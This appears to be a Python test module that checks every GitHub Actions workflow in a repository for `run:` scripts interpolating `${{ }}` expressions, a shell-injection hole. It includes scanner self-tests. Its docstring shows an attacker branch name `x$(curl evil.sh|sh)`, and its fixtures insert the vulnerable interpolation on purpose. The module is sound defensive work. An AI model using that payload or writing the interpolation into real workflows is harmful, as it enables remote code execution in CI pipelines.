"""No `run:` block in any workflow may interpolate an Actions expression (#683).

#680 fixed one instance: the `bot-push-guard` job pasted
`${{ github.event.pull_request.head.ref }}` into its shell. GitHub substitutes a
`${{ }}` expression into the *script source* before bash ever parses it, and a
pull request branch name is attacker-chosen on a fork — git permits `$( )`,
backticks and quotes inside a ref, so a branch called `x$(curl evil.sh|sh)` runs
as shell in the job. Event data has to travel through `env:` and be referenced as
`"$HEAD_REF"`, where bash sees a value rather than source text.

That fix pinned the rule for exactly one job in one file. A reviewer read the
other six workflows by hand and found them clean; nothing kept them that way.
This module asserts the invariant over **every job in every workflow**, so the
next `run:` block that interpolates an expression fails here instead of being
caught by whoever happens to look.

There is no YAML parser available — the package ships with no runtime
dependencies — so the scanner below is line-anchored, in the manner of
`tests/test_keel_evidence_workflow.py`. Being hand-rolled, it is itself a way
for the invariant to pass while checking nothing: a walk that silently matches
no file, no job or no `run:` block would report a clean repository forever. So
:class:`TheScannerFindsWhatIsThere` exercises the scanner against workflow text
whose answer is known, :class:`TheScannerCannotSilentlyMatchNothing` asserts
non-zero counts against the real tree, and
:class:`AnInterpolatedExpressionIsCaught` mutates a real workflow in a temporary
directory and requires the failure to name the file, the job and the line.
"""

from __future__ import annotations

import re
import tempfile
import unittest
from dataclasses import dataclass
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
WORKFLOWS = REPO_ROOT / ".github" / "workflows"

#: The opening of an Actions expression. Substituted by the runner into whatever
#: text encloses it, which is why its presence in a shell script is the bug and
#: not the value it happens to expand to today.
EXPRESSION = "${{"

#: `run` and nothing else: `runs-on:` starts with the same three letters, and a
#: step key called `run-name:` would match a looser pattern too. The optional
#: `- ` is the first key of a step written as a list item.
_RUN_KEY = re.compile(r"^(?P<indent>\s*)(?:-\s+)?run:(?P<value>\s.*|)$")

#: A mapping key at the head of a line, used to find job ids. Values are ignored;
#: only the name and the indent matter.
_KEY = re.compile(r"^(?P<indent>\s*)(?P<name>[A-Za-z_][\w.-]*):(?:\s.*|)$")


@dataclass(frozen=True)
class RunBlock:
    """One `run:` value, with enough context to name it in a failure."""

    workflow: str
    job: str
    line: int
    text: str

    def where(self) -> str:
        return f".github/workflows/{self.workflow}:{self.line} (job {self.job!r})"


def _indent(line: str) -> int:
    return len(line) - len(line.lstrip())


def _is_comment(line: str) -> bool:
    return line.lstrip().startswith("#")


def jobs_in(source: str) -> list[tuple[str, int, int]]:
    """Every job in a workflow as `(id, start, end)` half-open line indices.

    Anchored on the top-level `jobs:` key and on the indent of the first job id
    under it, rather than on a fixed two spaces: a workflow indented differently
    would otherwise scan as having no jobs at all, which is the silent pass this
    whole module exists to prevent.
    """
    lines = source.splitlines()
    try:
        top = next(i for i, line in enumerate(lines) if re.match(r"^jobs:\s*(#.*)?$", line))
    except StopIteration:
        return []

    body = range(top + 1, len(lines))
    starts: list[tuple[str, int]] = []
    job_indent: int | None = None
    for i in body:
        line = lines[i]
        if not line.strip() or _is_comment(line):
            continue
        if _indent(line) == 0:  # a sibling of `jobs:`; the mapping has ended.
            break
        key = _KEY.match(line)
        if not key:
            continue
        indent = len(key.group("indent"))
        if job_indent is None:
            job_indent = indent
        if indent == job_indent:
            starts.append((key.group("name"), i))

    end_of_jobs = next(
        (
            i
            for i in body
            if lines[i].strip() and not _is_comment(lines[i]) and _indent(lines[i]) == 0
        ),
        len(lines),
    )
    return [
        (name, start, starts[n + 1][1] if n + 1 < len(starts) else end_of_jobs)
        for n, (name, start) in enumerate(starts)
    ]


def run_blocks_in(source: str, workflow: str) -> list[RunBlock]:
    """Every `run:` value in a workflow, block scalar and inline forms alike.

    A value spans its own line plus every following line indented deeper than the
    `run` key — which is the rule for a block scalar (`run: |`, `run: >` and
    their `-`/`+` chomping variants) and for a plain scalar continued over
    several lines, so both are collected without having to tell them apart. That
    also means a `run:` appearing *inside* a script (a heredoc writing a
    workflow, say) is read as the content it is rather than as a second block.
    """
    lines = source.splitlines()
    blocks: list[RunBlock] = []
    for job, start, end in jobs_in(source):
        i = start
        while i < end:
            match = _RUN_KEY.match(lines[i])
            if not match:
                i += 1
                continue
            key_indent = len(match.group("indent").expandtabs())
            if lines[i].lstrip().startswith("- "):
                key_indent += 2
            collected = [match.group("value")]
            j = i + 1
            while j < end and (not lines[j].strip() or _indent(lines[j]) > key_indent):
                collected.append(lines[j])
                j += 1
            blocks.append(
                RunBlock(workflow=workflow, job=job, line=i + 1, text="\n".join(collected))
            )
            i = j
    return blocks


def workflow_files(directory: Path = WORKFLOWS) -> list[Path]:
    return sorted(p for p in directory.iterdir() if p.suffix in (".yml", ".yaml"))


def all_run_blocks(directory: Path = WORKFLOWS) -> list[RunBlock]:
    return [
        block
        for path in workflow_files(directory)
        for block in run_blocks_in(path.read_text(encoding="utf-8"), path.name)
    ]


def interpolating_blocks(directory: Path = WORKFLOWS) -> list[RunBlock]:
    """The blocks that break the rule, ready to be named in an assertion."""
    return [block for block in all_run_blocks(directory) if EXPRESSION in block.text]


class TheScannerFindsWhatIsThere(unittest.TestCase):
    """The invariant is only worth as much as the walk underneath it."""

    SAMPLE = """\
name: sample
on: [push]

jobs:
  first:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - name: Block scalar
        run: |
          echo one
          echo two
      - name: Inline
        run: echo three
      - run: echo four

  second:
    # A comment about run: blocks that is not one.
    runs-on: ubuntu-latest
    steps:
      - name: Folded
        run: >-
          echo five
      - name: Continued plain scalar
        run: echo six
          && echo seven
        shell: bash
"""

    def blocks(self) -> list[RunBlock]:
        return run_blocks_in(self.SAMPLE, "sample.yml")

    def test_both_jobs_are_found(self):
        self.assertEqual([name for name, _, _ in jobs_in(self.SAMPLE)], ["first", "second"])

    def test_every_run_block_is_found_once(self):
        self.assertEqual(
            [(b.job, b.line) for b in self.blocks()],
            [("first", 10), ("first", 14), ("first", 15), ("second", 22), ("second", 25)],
        )

    def test_a_block_scalar_carries_its_whole_script(self):
        first = self.blocks()[0]
        self.assertIn("echo one", first.text)
        self.assertIn("echo two", first.text)
        # And stops at the next step rather than swallowing the file.
        self.assertNotIn("echo three", first.text)

    def test_an_inline_script_carries_its_value(self):
        self.assertIn("echo three", self.blocks()[1].text)
        self.assertIn("echo four", self.blocks()[2].text)

    def test_a_folded_scalar_carries_its_script(self):
        self.assertIn("echo five", self.blocks()[3].text)

    def test_a_continued_plain_scalar_keeps_its_continuation(self):
        last = self.blocks()[4]
        self.assertIn("echo six", last.text)
        self.assertIn("echo seven", last.text)
        # `shell: bash` is a sibling key, not part of the script.
        self.assertNotIn("shell: bash", last.text)

    def test_runs_on_is_not_a_run_block(self):
        self.assertNotIn("ubuntu-latest", "\n".join(b.text for b in self.blocks()))

    def test_a_run_key_inside_a_script_is_script(self):
        nested = """\
jobs:
  only:
    steps:
      - name: Write a workflow
        run: |
          cat > w.yml <<'YAML'
          jobs:
            inner:
              steps:
                - run: echo ${{ github.event.pull_request.head.ref }}
          YAML
"""
        blocks = run_blocks_in(nested, "nested.yml")
        self.assertEqual(len(blocks), 1)
        # Read as content, and still caught: an expression in a heredoc that
        # writes a workflow is substituted by *this* run just the same.
        self.assertIn(EXPRESSION, blocks[0].text)

    def test_a_file_without_jobs_yields_nothing(self):
        self.assertEqual(run_blocks_in("name: nothing\non: [push]\n", "none.yml"), [])

    def test_the_jobs_mapping_ends_at_the_next_top_level_key(self):
        trailing = self.SAMPLE + "\nconcurrency:\n  group: sample\n"
        self.assertEqual([name for name, _, _ in jobs_in(trailing)], ["first", "second"])
        self.assertNotIn("concurrency", "\n".join(b.text for b in run_blocks_in(trailing, "x.yml")))


class TheScannerCannotSilentlyMatchNothing(unittest.TestCase):
    """A walk that matches nothing reports a clean repository forever (#677)."""

    def test_the_workflow_directory_is_read(self):
        self.assertTrue(WORKFLOWS.is_dir(), f"{WORKFLOWS} must exist")
        names = [path.name for path in workflow_files()]
        self.assertGreater(len(names), 0, "no workflow files were inspected")
        # Anchored on files that must exist: a glob typo that matched a
        # different, smaller set would otherwise still pass the count above.
        self.assertIn("ci.yml", names)
        self.assertIn("keel-ship.yml", names)

    def test_jobs_are_found_in_the_workflows_that_have_them(self):
        ci = (WORKFLOWS / "ci.yml").read_text(encoding="utf-8")
        found = [name for name, _, _ in jobs_in(ci)]
        self.assertGreater(len(found), 1)
        self.assertIn("bot-push-guard", found)

    def test_run_blocks_are_found(self):
        blocks = all_run_blocks()
        self.assertGreater(len(blocks), 10, "the scan found implausibly few run: blocks")
        # More than one file contributes, so a per-file break cannot hide.
        self.assertGreater(len({block.workflow for block in blocks}), 1)
        self.assertTrue(
            any(block.job == "bot-push-guard" for block in blocks),
            "the job #680 fixed is not among the scanned run: blocks",
        )


class NoRunBlockInterpolatesAnExpression(unittest.TestCase):
    """The invariant itself (#680, #683)."""

    def test_no_workflow_pastes_an_actions_expression_into_a_shell(self):
        # The locations rather than the blocks, so a failure reads as a list of
        # places to go and not as a dump of every offending script.
        offenders = [block.where() for block in interpolating_blocks()]
        self.assertEqual(
            offenders,
            [],
            "an Actions expression is substituted into the script source before "
            "bash parses it; pass the value through `env:` and reference it as "
            '"$NAME" instead',
        )


class AnInterpolatedExpressionIsCaught(unittest.TestCase):
    """The mutation the invariant exists to fail on, run against a real file."""

    OFFENDING = "echo ${{ github.event.pull_request.head.ref }}"

    def _mutated(self, workflow: str, replace: str, mutation: str) -> Path:
        """A copy of the real workflow tree with one `run:` line changed."""
        holder = tempfile.TemporaryDirectory()
        self.addCleanup(holder.cleanup)
        directory = Path(holder.name)
        for path in workflow_files():
            (directory / path.name).write_text(path.read_text(encoding="utf-8"), encoding="utf-8")
        target = directory / workflow
        body = target.read_text(encoding="utf-8")
        self.assertIn(replace, body, f"the fixture line is gone from {workflow}")
        target.write_text(body.replace(replace, mutation, 1), encoding="utf-8")
        return directory

    def test_an_expression_in_a_block_scalar_is_reported_with_file_job_and_line(self):
        guard_call = "          python scripts/bot_push_after_human_push_check.py \\"
        directory = self._mutated("ci.yml", guard_call, f"          {self.OFFENDING}\n{guard_call}")
        offenders = interpolating_blocks(directory)
        self.assertEqual(len(offenders), 1, offenders)
        found = offenders[0]
        self.assertEqual(found.workflow, "ci.yml")
        self.assertEqual(found.job, "bot-push-guard")
        self.assertIn(self.OFFENDING, found.text)
        # The line named is the `run:` key that opens the offending script, so
        # the failure points a reader at the block and not merely at the file.
        lines = (directory / "ci.yml").read_text(encoding="utf-8").splitlines()
        self.assertEqual(lines[found.line - 1].strip(), "run: |")
        self.assertLess(found.line, lines.index(f"          {self.OFFENDING}") + 1)
        self.assertIn("ci.yml", found.where())
        self.assertIn("bot-push-guard", found.where())
        self.assertIn(f":{found.line}", found.where())

    def test_an_expression_in_an_inline_run_is_reported(self):
        directory = self._mutated(
            "ci.yml",
            "        run: python -m unittest discover -s tests -v",
            f"        run: {self.OFFENDING}",
        )
        offenders = interpolating_blocks(directory)
        self.assertEqual(len(offenders), 1, offenders)
        self.assertEqual(offenders[0].workflow, "ci.yml")
        self.assertIn(EXPRESSION, offenders[0].text)

    def test_an_expression_outside_a_run_block_is_not_reported(self):
        # `env:` is the fix #680 applied, so it must stay legal.
        directory = self._mutated(
            "ci.yml",
            "        run: python -m unittest discover -s tests -v",
            "        env:\n"
            "          HEAD_REF: ${{ github.event.pull_request.head.ref }}\n"
            "        run: python -m unittest discover -s tests -v",
        )
        self.assertEqual(interpolating_blocks(directory), [])


if __name__ == "__main__":
    unittest.main()
